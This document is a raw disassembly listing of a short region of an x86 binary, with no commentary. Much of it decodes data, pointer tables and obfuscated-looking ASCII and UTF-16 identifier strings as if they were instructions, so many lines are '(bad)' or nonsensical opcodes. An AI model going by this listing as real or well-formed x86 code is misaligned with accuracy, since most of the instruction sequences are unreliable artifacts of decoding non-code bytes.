  42a536:	in     al,dx
  42a537:	mov    eax,es
  42a539:	dec    eax
  42a53a:	mov    DWORD PTR [edx],esi
  42a53c:	fmul   QWORD PTR [edx]
  42a53e:	jne    0x42a4cb
  42a540:	(bad)  
  42a541:	(bad)  
  42a543:	or     DWORD PTR [ebp-0x31],eax
  42a546:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a54d:	cmp    bh,bh
  42a54f:	jne    0x42a596
  42a551:	lea    ecx,[ebx-0x38372750]
  42a557:	inc    ebx
  42a559:	mov    eax,ecx
  42a55b:	mov    eax,0xa00c111
  42a560:	jne    0x42a5a7
  42a562:	mov    esi,DWORD PTR [ebx]
  42a564:	test   al,0x3
  42a566:	inc    ebp
  42a567:	mov    DWORD PTR [eax-0xc],edx
  42a56a:	fiadd  WORD PTR [ebp-0x1]
  42a56d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a573:	jb     0x42a576
  42a575:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a57b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a581:	retf   
  42a582:	mov    edx,ecx
  42a584:	adc    al,0x84
  42a586:	(bad)  
  42a587:	std    
  42a588:	ret    
  42a589:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a58f:	hlt    
  42a590:	rol    edi,0x82
  42a593:	ret    
  42a594:	cld    
  42a595:	enter  0x11ff,0x45
  42a599:	inc    ebp
  42a59a:	pop    edi
  42a59b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a59e:	ret    0xc7
  42a5a1:	test   BYTE PTR [ebx+0x45325198],cl
  42a5a7:	jmp    0x42a534
  42a5a9:	push   0x8
  42a5ab:	call   DWORD PTR [esi]
  42a5ad:	in     al,dx
  42a5ae:	add    BYTE PTR [ebp+0x1],0x50
  42a5b2:	add    bl,ah
  42a5b4:	add    bh,bh
  42a5b6:	icebp  
  42a5b7:	mov    ecx,DWORD PTR [eax]
  42a5b9:	cld    
  42a5ba:	pop    es
  42a5bb:	dec    ebp
  42a5bc:	shl    DWORD PTR [ebx],0x72
  42a5bf:	add    eax,DWORD PTR [eax]
  42a5c1:	cmp    edx,ecx
  42a5c3:	je     0x42a5d5
  42a5c5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5c8:	inc    edi
  42a5ca:	or     al,0xc3
  42a5cc:	jmp    FWORD PTR [edx-0x18]
  42a5cf:	(bad)  
  42a5d0:	sti    
  42a5d1:	cwde   
  42a5d2:	(bad)  
  42a5d3:	call   0xffa09ede
  42a5d8:	or     al,0x45
  42a5da:	push   ebp
  42a5db:	sub    esp,0x18
  42a5de:	push   ebx
  42a5df:	inc    ebp
  42a5e0:	mov    edi,edi
  42a5e2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5e9:	test   al,0x50
  42a5eb:	inc    ebp
  42a5ec:	push   ecx
  42a5ed:	push   eax
  42a5ee:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5f4:	add    ah,bh
  42a5f6:	(bad)  
  42a5f7:	dec    ebp
  42a5f8:	add    DWORD PTR [ebx],esi
  42a5fa:	inc    ebp
  42a5fb:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a601:	push   0xffffff8b
  42a603:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a609:	add    eax,DWORD PTR [ecx]
  42a60b:	or     BYTE PTR [eax],al
  42a60d:	call   0xff849e12
  42a612:	mov    eax,DWORD PTR [ebp+0x14]
  42a615:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a61b:	inc    ebp
  42a61c:	dec    ecx
  42a61d:	add    ebp,DWORD PTR [edx+0x14]
  42a620:	push   0x8b3045
  42a625:	call   0x33acf39a
  42a62a:	inc    DWORD PTR [ebx]
  42a62c:	mov    DWORD PTR [edi],ecx
  42a62e:	mov    eax,ecx
  42a630:	or     BYTE PTR [ebp-0x3d],cl
  42a633:	cmp    eax,edi
  42a635:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a63a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a640:	adc    al,0xc9
  42a642:	inc    ebp
  42a643:	adc    BYTE PTR [eax+0x55],dl
  42a646:	jne    0x42a634
  42a648:	call   0xff53a5d8
  42a64d:	dec    ebp
  42a64e:	inc    ebp
  42a64f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a655:	add    BYTE PTR [ebx],bh
  42a657:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a65b:	push   eax
  42a65c:	or     al,0x51
  42a65e:	dec    ebp
  42a65f:	xor    DWORD PTR [ebx],0xf320398
  42a665:	cmp    eax,DWORD PTR [ebp+0x74]
  42a668:	mov    edi,edi
  42a66a:	pop    edi
  42a66b:	adc    BYTE PTR [ebx+0x75],bl
  42a66e:	ret    0x50
  42a671:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a675:	(bad)  
  42a676:	clc    
  42a677:	mov    esp,ebp
  42a679:	pop    ecx
  42a67a:	mov    ecx,0xf80085c2
  42a67f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a682:	push   esi
  42a683:	push   esi
  42a684:	(bad)  
  42a685:	lock add DWORD PTR [ebp+0x44],eax
  42a689:	mov    edx,DWORD PTR [eax]
  42a68b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a68f:	or     BYTE PTR [eax+0x7],dl
  42a692:	push   ecx
  42a693:	ret    
  42a694:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a69a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a6a0:	or     al,0x80
  42a6a2:	jge    0x42a6a5
  42a6a4:	mov    DWORD PTR [eax],eax
  42a6a6:	and    al,0x8
  42a6a8:	cmp    DWORD PTR [ebp+0x10],eax
  42a6ab:	mov    edx,DWORD PTR [esi]
  42a6ad:	xchg   esp,eax
  42a6ae:	dec    esp
  42a6af:	add    BYTE PTR [eax],dl
  42a6b1:	mov    ecx,edx
  42a6b3:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a6b7:	dec    ebp
  42a6b8:	into   
  42a6b9:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a6bf:	mov    edx,DWORD PTR [eax+0x14]
  42a6c2:	das    
  42a6c3:	add    al,0x45
  42a6c5:	add    BYTE PTR [ebp+0x0],dh
  42a6c8:	mov    edi,edi
  42a6ca:	and    al,0x50
  42a6cc:	mov    eax,DWORD PTR [eax]
  42a6ce:	and    al,0xd1
  42a6d0:	xor    eax,DWORD PTR [esi]
  42a6d2:	lea    eax,[ebp+0x8]
  42a6d5:	xor    esi,DWORD PTR [edx+0x3]
  42a6d8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6de:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6e4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ee:	cmp    edi,edi
  42a6f0:	pushf  
  42a6f1:	mov    edi,edi
  42a6f3:	or     BYTE PTR [esi+ecx*1],cl
  42a6f6:	jne    0x42a6bb
  42a6f8:	call   0xba6c4
  42a6fd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a701:	mov    ebx,DWORD PTR [eax]
  42a703:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a707:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a70f:	pop    esi
  42a710:	dec    ecx
  42a712:	and    al,0x10
  42a714:	call   DWORD PTR [ebp+0x24]
  42a717:	in     al,dx
  42a718:	call   0xffc6a601
  42a71d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a721:	pushf  
  42a722:	pop    esi
  42a723:	mov    ebp,esp
  42a725:	and    al,0xc2
  42a727:	push   edi
  42a728:	add    BYTE PTR [ecx+0x3a],al
  42a72b:	mov    DWORD PTR [ebp+0x24],esi
  42a72e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a734:	dec    DWORD PTR [eax]
  42a736:	and    al,0x7
  42a738:	(bad)  
  42a739:	cli    
  42a73a:	and    al,0x98
  42a73c:	or     BYTE PTR [edx],dh
  42a73e:	sbb    BYTE PTR [ebx],al
  42a740:	adc    al,0x89
  42a742:	jmp    DWORD PTR [esp]
  42a745:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a74b:	adc    al,0x8
  42a74d:	dec    ebp
  42a74e:	adc    BYTE PTR [ebp-0x7c],dh
  42a751:	mov    esi,DWORD PTR [edx]
  42a753:	and    al,0x24
  42a755:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a75b:	add    edi,eax
  42a75d:	pcmpeqb mm1,mm2
  42a760:	jmp    0x42a7ae
  42a762:	dec    DWORD PTR [eax]
  42a764:	je     0x42a751
  42a766:	mov    edi,DWORD PTR [ecx]
  42a768:	pop    ebp
  42a769:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a76d:	cwde   
  42a76e:	mov    DWORD PTR [eax-0x8],ebp
  42a771:	jge    0x42a7db
  42a773:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a779:	jl     0x42a7c5
  42a77b:	adc    BYTE PTR [eax],al
  42a77d:	pop    esp
  42a77e:	cmp    al,0x10
  42a780:	add    BYTE PTR [ecx+0x41],dl
  42a783:	adc    BYTE PTR [eax],al
  42a785:	test   al,0x21
  42a787:	adc    BYTE PTR [eax],al
  42a789:	cs jbe 0x42a79c
  42a78c:	add    BYTE PTR [edx+0xe],ch
  42a78f:	adc    BYTE PTR [eax],al
  42a791:	clc    
  42a792:	pusha  
  42a793:	adc    BYTE PTR [eax],al
  42a795:	jp     0x42a7d8
  42a797:	adc    BYTE PTR [eax],al
  42a799:	mov    ds:0x88001059,eax
  42a79e:	pop    ebp
  42a79f:	adc    BYTE PTR [eax],al
  42a7a1:	inc    ax
  42a7a3:	adc    BYTE PTR [eax],al
  42a7a5:	jns    0x42a74e
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x7affbd59],al
  42a7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7b3:	inc    edx
  42a7b4:	add    BYTE PTR [ecx-0x72ffbd59],cl
  42a7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7bb:	inc    edx
  42a7bc:	add    BYTE PTR [ecx-0x6affbd59],dl
  42a7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7c3:	inc    edx
  42a7c4:	add    BYTE PTR [ecx-0x62ffbd59],bl
  42a7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7cb:	inc    edx
  42a7cc:	add    BYTE PTR [ecx-0x2effbd59],ah
  42a7d2:	cmp    BYTE PTR [eax],dl
  42a7d4:	add    BYTE PTR [edi],dl
  42a7d6:	xor    BYTE PTR [eax],dl
  42a7d8:	add    BYTE PTR [eax],al
  42a7da:	pop    ds
  42a7db:	adc    BYTE PTR [eax],al
  42a7dd:	(bad)  
  42a7de:	adc    BYTE PTR ds:[eax],al
  42a7e1:	in     eax,0x19
  42a7e3:	adc    BYTE PTR [eax],al
  42a7e5:	bound  ebx,QWORD PTR [ecx]
  42a7e7:	adc    BYTE PTR [eax],al
  42a7e9:	shl    BYTE PTR [edi+0x10],1
  42a7ec:	add    BYTE PTR [edi-0x2effefa9],al
  42a7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7f3:	inc    edx
  42a7f4:	add    ch,dl
  42a7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7f7:	inc    edx
  42a7f8:	add    cl,bl
  42a7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7fb:	inc    edx
  42a7fc:	add    ch,bl
  42a7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ff:	inc    edx
  42a800:	add    cl,ah
  42a802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a803:	inc    edx
  42a804:	add    ch,ah
  42a806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a807:	inc    edx
  42a808:	add    cl,ch
  42a80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a80b:	inc    edx
  42a80c:	add    ch,ch
  42a80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a80f:	inc    edx
  42a810:	add    dl,ah
  42a812:	adc    BYTE PTR ds:[eax],al
  42a815:	ds pop ebp
  42a817:	adc    BYTE PTR [eax],al
  42a819:	add    BYTE PTR [esi+0x10],ah
  42a81c:	add    al,ch
  42a81e:	pop    eax
  42a81f:	adc    BYTE PTR [eax],al
  42a821:	cdq    
  42a822:	outs   dx,BYTE PTR ds:[esi]
  42a823:	adc    BYTE PTR [eax],al
  42a825:	ja     0x42a887
  42a827:	adc    BYTE PTR [eax],al
  42a829:	jne    0x42a862
  42a82b:	adc    BYTE PTR [eax],al
  42a82d:	arpl   WORD PTR [eax+edx*1],bx
  42a830:	add    BYTE PTR [ecx],dl
  42a832:	test   al,0x42
  42a834:	add    BYTE PTR ds:0x190042a8,dl
  42a83a:	test   al,0x42
  42a83c:	add    BYTE PTR ds:0x210042a8,bl
  42a842:	test   al,0x42
  42a844:	add    BYTE PTR ds:0x290042a8,ah
  42a84a:	test   al,0x42
  42a84c:	add    BYTE PTR ds:0x5c0042a8,ch
  42a852:	adc    DWORD PTR [eax],edx
  42a854:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a85b:	adc    BYTE PTR [eax],al
  42a85d:	and    al,0x30
  42a85f:	adc    BYTE PTR [eax],al
  42a861:	ret    
  42a862:	pop    edi
  42a863:	adc    BYTE PTR [eax],al
  42a865:	loopne 0x42a8cd
  42a867:	adc    BYTE PTR [eax],al
  42a869:	add    eax,0xd400105b
  42a86e:	aas    
  42a86f:	adc    BYTE PTR [eax],al
  42a871:	push   ecx
  42a872:	test   al,0x42
  42a874:	add    BYTE PTR [ebp-0x58],dl
  42a877:	inc    edx
  42a878:	add    BYTE PTR [ecx-0x58],bl
  42a87b:	inc    edx
  42a87c:	add    BYTE PTR [ebp-0x58],bl
  42a87f:	inc    edx
  42a880:	add    BYTE PTR [ecx-0x58],ah
  42a883:	inc    edx
  42a884:	add    BYTE PTR [ebp-0x58],ah
  42a887:	inc    edx
  42a888:	add    BYTE PTR [ecx-0x58],ch
  42a88b:	inc    edx
  42a88c:	add    BYTE PTR [ebp-0x58],ch
  42a88f:	inc    edx
  42a890:	add    dh,dl
  42a892:	sbb    eax,0x10f00010
  42a897:	adc    BYTE PTR [eax],al
  42a899:	inc    ecx
  42a89a:	bound  edx,QWORD PTR [eax]
  42a89c:	add    BYTE PTR [ebx+eax*1],ah
  42a89f:	adc    BYTE PTR [eax],al
  42a8a1:	jecxz  0x42a906
  42a8a3:	adc    BYTE PTR [eax],al
  42a8a5:	pushf  
  42a8a6:	xor    DWORD PTR [eax],edx
  42a8a8:	add    BYTE PTR [ecx],al
  42a8aa:	or     dl,BYTE PTR [eax]
  42a8ac:	add    dh,dl
  42a8ae:	inc    edi
  42a8af:	adc    BYTE PTR [eax],al
  42a8b1:	xchg   ecx,eax
  42a8b2:	test   al,0x42
  42a8b4:	add    BYTE PTR [ebp-0x66ffbd58],dl
  42a8ba:	test   al,0x42
  42a8bc:	add    BYTE PTR [ebp-0x5effbd58],bl
  42a8c2:	test   al,0x42
  42a8c4:	add    BYTE PTR [ebp-0x56ffbd58],ah
  42a8ca:	test   al,0x42
  42a8cc:	add    BYTE PTR [ebp+0x430042a8],ch
  42a8d2:	xor    dh,BYTE PTR [edx]
  42a8d4:	xor    eax,0x5a52345f
  42a8d9:	push   esp
  42a8da:	xor    BYTE PTR [esi],dh
  42a8dc:	add    BYTE PTR [ecx+0x36],cl
  42a8df:	push   eax
  42a8e0:	pop    edi
  42a8e1:	ss inc ebx
  42a8e3:	ss pop edx
  42a8e5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8e8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8ec:	pop    edi
  42a8ed:	dec    esi
  42a8ee:	dec    esp
  42a8ef:	dec    eax
  42a8f0:	xor    esi,DWORD PTR [edx]
  42a8f2:	pop    edi
  42a8f3:	xor    al,0x4b
  42a8f5:	add    BYTE PTR [eax+0x49],cl
  42a8f8:	push   ebp
  42a8f9:	xor    al,0x5f
  42a8fb:	dec    esp
  42a8fc:	inc    edx
  42a8fd:	dec    ecx
  42a8fe:	cmp    DWORD PTR [edi+ebx*2],esi
  42a901:	pop    ecx
  42a902:	inc    edi
  42a903:	add    BYTE PTR [eax+0x50],bl
  42a906:	dec    eax
  42a907:	pop    edi
  42a908:	push   ebp
  42a909:	push   ecx
  42a90a:	inc    edi
  42a90b:	xor    cl,BYTE PTR [edx+0x38]
  42a90e:	push   esi
  42a90f:	add    BYTE PTR [ebx+0x4a],al
  42a912:	push   edx
  42a913:	pop    edi
  42a914:	dec    edi
  42a915:	dec    eax
  42a916:	dec    edi
  42a917:	dec    edi
  42a918:	dec    edx
  42a919:	add    BYTE PTR [ecx+0x52],al
  42a91c:	cmp    DWORD PTR [edi+0x56],ebx
  42a91f:	aaa    
  42a920:	dec    esp
  42a921:	cmp    DWORD PTR [ebx+0x5f],eax
  42a924:	push   edx
  42a925:	inc    esp
  42a926:	add    BYTE PTR [ecx+0x37],bl
  42a929:	inc    esp
  42a92a:	pop    edi
  42a92b:	dec    ecx
  42a92c:	xor    esi,DWORD PTR [edi]
  42a92e:	xor    DWORD PTR [edi+0x49],ebx
  42a931:	push   esp
  42a932:	xor    eax,DWORD PTR [eax]
  42a934:	push   edx
  42a935:	xor    BYTE PTR [eax+0x5f],bl
  42a938:	dec    eax
  42a939:	push   edi
  42a93a:	inc    esi
  42a93b:	xor    DWORD PTR [edi+0x5f],edx
  42a93e:	cmp    BYTE PTR [ebx+0x37],dl
  42a941:	add    BYTE PTR [esi+0x42],dl
  42a944:	dec    ecx
  42a945:	xor    ebx,DWORD PTR [edi+0x45]
  42a948:	xor    BYTE PTR [ebp+0x5f],cl
  42a94b:	xor    al,0x34
  42a94d:	xor    BYTE PTR [edx+0x5f],cl
  42a950:	inc    edi
  42a951:	add    BYTE PTR [edx+0x57],dl
  42a954:	xor    ebx,DWORD PTR [edi+0x31]
  42a957:	dec    edx
  42a958:	push   edi
  42a959:	xor    eax,0x4d435f
  42a95e:	dec    ecx
  42a95f:	xor    eax,0x36365f39
  42a964:	dec    eax
  42a965:	xor    BYTE PTR [eax],al
  42a967:	dec    edi
  42a968:	inc    ebx
  42a969:	push   edi
  42a96a:	pop    edi
  42a96b:	inc    edi
  42a96c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a971:	add    BYTE PTR [edx+0x58],al
  42a974:	inc    edi
  42a975:	ss pop edi
  42a977:	push   esi
  42a978:	inc    ebx
  42a979:	dec    esi
  42a97a:	inc    esp
  42a97b:	add    BYTE PTR [edi+0x4d],cl
  42a97e:	inc    edi
  42a97f:	xor    ebx,DWORD PTR [edi+0x34]
  42a982:	dec    esi
  42a983:	pop    edx
  42a984:	cmp    BYTE PTR [edi+0x58],bl
  42a987:	cmp    BYTE PTR [eax],al
  42a989:	push   edx
  42a98a:	pop    eax
  42a98b:	push   ecx
  42a98c:	pop    edi
  42a98d:	dec    esp
  42a98e:	push   edx
  42a98f:	dec    ecx
  42a990:	dec    edi
  42a991:	inc    esp
  42a992:	pop    edi
  42a993:	dec    edi
  42a994:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a998:	push   eax
  42a999:	inc    ebp
  42a99a:	pop    edi
  42a99b:	xor    eax,0x565f3945
  42a9a0:	add    BYTE PTR [edi+0x4e],al
  42a9a3:	push   esi
  42a9a4:	pop    edi
  42a9a5:	inc    edi
  42a9a6:	push   esp
  42a9a7:	dec    eax
  42a9a8:	xor    dh,BYTE PTR [ecx]
  42a9aa:	pop    edi
  42a9ab:	dec    edi
  42a9ac:	xor    eax,DWORD PTR ss:[eax]
  42a9af:	inc    esp
  42a9b0:	inc    ebp
  42a9b1:	dec    ecx
  42a9b2:	pop    edi
  42a9b3:	push   edx
  42a9b4:	dec    eax
  42a9b5:	xor    al,0x48
  42a9b7:	dec    ecx
  42a9b8:	ss pop edi
  42a9ba:	aaa    
  42a9bb:	aaa    
  42a9bc:	dec    ecx
  42a9bd:	dec    ebp
  42a9be:	add    BYTE PTR [eax+0x54],cl
  42a9c1:	ss pop edi
  42a9c3:	inc    esi
  42a9c4:	inc    edx
  42a9c5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9c8:	dec    esi
  42a9c9:	ss dec edx
  42a9cb:	pop    edi
  42a9cc:	dec    ecx
  42a9cd:	dec    esp
  42a9ce:	inc    edi
  42a9cf:	inc    esp
  42a9d0:	dec    eax
  42a9d1:	xor    BYTE PTR [eax],bh
  42a9d3:	xor    eax,0x4c344f00
  42a9d8:	xor    esi,DWORD PTR [edi]
  42a9da:	xor    BYTE PTR [edi+0x44],bl
  42a9dd:	inc    edi
  42a9de:	dec    ebx
  42a9df:	xor    al,BYTE PTR [ecx+0x43]
  42a9e2:	add    BYTE PTR [edi+0x32],cl
  42a9e5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9e8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9eb:	pop    edx
  42a9ec:	add    BYTE PTR [eax+0x4c],bl
  42a9ef:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9f2:	inc    ecx
  42a9f3:	dec    edx
  42a9f4:	inc    esi
  42a9f5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9f8:	pop    eax
  42a9f9:	inc    edi
  42a9fa:	inc    edx
  42a9fb:	add    BYTE PTR [eax+0x33],dl
  42a9fe:	dec    esi
  42a9ff:	pop    edi
  42aa00:	dec    eax
  42aa01:	xor    eax,0x485f53
  42aa06:	dec    ebp
  42aa07:	xor    BYTE PTR [edx+0x5f],al
  42aa0a:	dec    edx
  42aa0b:	pop    eax
  42aa0c:	push   esp
  42aa0d:	dec    ecx
  42aa0e:	dec    esp
  42aa0f:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42aa13:	xor    esi,DWORD PTR [eax]
  42aa15:	pop    edi
  42aa16:	inc    ecx
  42aa17:	pop    edx
  42aa18:	push   ecx
  42aa19:	pop    edx
  42aa1a:	cmp    DWORD PTR [esi],esi
  42aa1c:	pop    edi
  42aa1d:	dec    eax
  42aa1e:	dec    esp
  42aa1f:	pop    edx
  42aa20:	add    BYTE PTR [ecx+0x57],dl
  42aa23:	pop    ecx
  42aa24:	pop    edi
  42aa25:	push   esi
  42aa26:	xor    al,0x44
  42aa28:	xor    DWORD PTR [eax],edi
  42aa2a:	xor    bl,BYTE PTR [edi+0x39]
  42aa2d:	push   esp
  42aa2e:	push   esp
  42aa2f:	add    BYTE PTR [esi+0x0],dl
  42aa32:	dec    edi
  42aa33:	add    BYTE PTR [edi+0x0],al
  42aa36:	add    BYTE PTR ss:[edi+0x0],bl
  42aa3a:	dec    edi
  42aa3b:	add    BYTE PTR [edx+0x0],bl
  42aa3e:	inc    ebp
  42aa3f:	add    BYTE PTR [eax],dh
  42aa41:	add    BYTE PTR [ebp+0x0],al
  42aa44:	xor    BYTE PTR [eax],al
  42aa46:	pop    edi
  42aa47:	add    BYTE PTR [eax],dh
  42aa49:	add    BYTE PTR ds:0x4f000000,dh
  42aa4f:	add    BYTE PTR ds:0x5f005700,dh
  42aa55:	add    BYTE PTR [edi],dh
  42aa57:	add    BYTE PTR [ebx+0x0],dl
  42aa5a:	push   ebp
  42aa5b:	add    BYTE PTR [edi+0x0],al
  42aa5e:	xor    al,0x0
  42aa60:	pop    edi
  42aa61:	add    BYTE PTR [ecx+0x0],dl
  42aa64:	inc    esp
  42aa65:	add    BYTE PTR [eax],al
  42aa67:	add    BYTE PTR [edx+0x0],dl
  42aa6a:	push   esp
  42aa6b:	add    BYTE PTR ds:0x52005f00,dh
  42aa71:	add    BYTE PTR [edi+0x0],dl
  42aa74:	xor    al,BYTE PTR [eax]
  42aa76:	xor    al,BYTE PTR [eax]
  42aa78:	xor    BYTE PTR [eax],al
  42aa7a:	xor    BYTE PTR [eax],al
  42aa7c:	pop    edi
  42aa7d:	add    BYTE PTR [esi],dh
  42aa7f:	add    BYTE PTR [eax],al
  42aa81:	add    BYTE PTR [eax+0x0],cl
  42aa84:	inc    ebp
  42aa85:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa89:	add    BYTE PTR [edi+0x0],bl
  42aa8c:	dec    edx
  42aa8d:	add    BYTE PTR [edx],dh
  42aa8f:	add    BYTE PTR [edi],dh
  42aa91:	add    BYTE PTR [ebp+0x0],dl
  42aa94:	add    BYTE PTR ss:[eax],dh
  42aa97:	add    BYTE PTR [eax],al
  42aa99:	add    BYTE PTR [esi+0x0],dl
  42aa9c:	cmp    BYTE PTR [eax],al
  42aa9e:	dec    edi
  42aa9f:	add    BYTE PTR [ecx],bh
  42aaa1:	add    BYTE PTR [edi+0x0],bl
  42aaa4:	pop    eax
  42aaa5:	add    BYTE PTR [edx+0x0],bl
  42aaa8:	dec    esp
  42aaa9:	add    BYTE PTR [ebx+0x0],cl
  42aaac:	add    BYTE PTR [eax],al
  42aaae:	dec    ecx
  42aaaf:	add    BYTE PTR [ebp+0x0],dl
  42aab2:	dec    edi
  42aab3:	add    BYTE PTR [eax],bh
  42aab5:	add    BYTE PTR [edi+0x0],bl
  42aab8:	inc    esp
  42aab9:	add    BYTE PTR [eax],bh
  42aabb:	add    BYTE PTR [ecx+0x0],cl
  42aabe:	dec    eax
  42aabf:	add    BYTE PTR [edi+0x0],cl
  42aac2:	pop    edi
  42aac3:	add    BYTE PTR [ebp+0x0],al
  42aac6:	pop    eax
  42aac7:	add    BYTE PTR [eax],al
  42aac9:	add    BYTE PTR [edx+0x0],dl
  42aacc:	dec    esp
  42aacd:	add    BYTE PTR [esi],dh
  42aacf:	add    BYTE PTR [edi+0x0],bl
  42aad2:	aaa    
  42aad3:	add    BYTE PTR [eax+0x0],bl
  42aad6:	xor    eax,DWORD PTR [eax]
  42aad8:	inc    edi
  42aad9:	add    BYTE PTR [ecx+0x0],dl
  42aadc:	pop    edi
  42aadd:	add    BYTE PTR [edx+0x0],cl
  42aae0:	add    BYTE PTR [eax],al
  42aae2:	inc    edi
  42aae3:	add    BYTE PTR [edi+0x0],cl
  42aae6:	push   ebx
  42aae7:	add    BYTE PTR [eax+eax*1],dh
  42aaea:	pop    edi
  42aaeb:	add    BYTE PTR [ecx+0x0],cl
  42aaee:	xor    DWORD PTR [eax],eax
  42aaf0:	push   esi
  42aaf1:	add    BYTE PTR [ebx],dh
  42aaf3:	add    BYTE PTR [edi+0x0],bl
  42aaf6:	dec    ecx
  42aaf7:	add    BYTE PTR [edx+0x0],bl
  42aafa:	add    BYTE PTR [eax],al
  42aafc:	inc    ebx
  42aafd:	add    BYTE PTR [ecx+0x0],bl
  42ab00:	inc    ecx
  42ab01:	add    BYTE PTR [eax],dh
  42ab03:	add    BYTE PTR [ecx],bh
  42ab05:	add    BYTE PTR [edi+0x0],bl
  42ab08:	cmp    DWORD PTR [eax],eax
  42ab0a:	push   eax
  42ab0b:	add    BYTE PTR [eax+eax*1],dh
  42ab0e:	pop    edx
  42ab0f:	add    BYTE PTR [eax],al
  42ab11:	add    BYTE PTR [edx+0x0],al
  42ab14:	inc    esi
  42ab15:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42ab19:	add    BYTE PTR [ebp+0x0],dl
  42ab1c:	push   ebp
  42ab1d:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab21:	add    BYTE PTR [eax],al
  42ab23:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab27:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab2b:	add    BYTE PTR [edi+0x0],bl
  42ab2e:	xor    eax,DWORD PTR [eax]
  42ab30:	cmp    DWORD PTR [eax],eax
  42ab32:	dec    eax
  42ab33:	add    BYTE PTR [edi+0x0],bl
  42ab36:	dec    ebp
  42ab37:	add    BYTE PTR [ecx+0x0],bl
  42ab3a:	cmp    DWORD PTR [eax],eax
  42ab3c:	inc    ecx
  42ab3d:	add    BYTE PTR [esi+0x0],cl
  42ab40:	add    BYTE PTR [eax],al
  42ab42:	inc    ebx
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	dec    esi
  42ab47:	add    BYTE PTR [eax+eax*1],dh
  42ab4a:	pop    edi
  42ab4b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab4f:	add    BYTE PTR [ebx+0x0],cl
  42ab52:	xor    DWORD PTR [eax],eax
  42ab54:	add    BYTE PTR [eax],al
  42ab56:	inc    ecx
  42ab57:	add    BYTE PTR [edi],dh
  42ab59:	add    BYTE PTR [edx+0x0],cl
  42ab5c:	pop    edi
  42ab5d:	add    BYTE PTR [ebx+0x0],al
  42ab60:	cmp    BYTE PTR [eax],al
  42ab62:	push   edi
  42ab63:	add    BYTE PTR [eax+0x0],dl
  42ab66:	pop    edi
  42ab67:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab6b:	add    BYTE PTR [edx],dh
  42ab6d:	add    BYTE PTR [eax],al
  42ab6f:	add    BYTE PTR [edx+0x0],al
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	push   edx
  42ab75:	push   ebx
  42ab76:	inc    esp
  42ab77:	push   ebx
  42ab78:	xor    edi,DWORD PTR [edx]
  42ab7a:	and    bl,BYTE PTR [esi-0x28]
  42ab7d:	lahf   
  42ab7e:	mov    esp,0x624e9040
  42ab83:	(bad)  
  42ab84:	push   cs
  42ab85:	dec    ebx
  42ab86:	lahf   
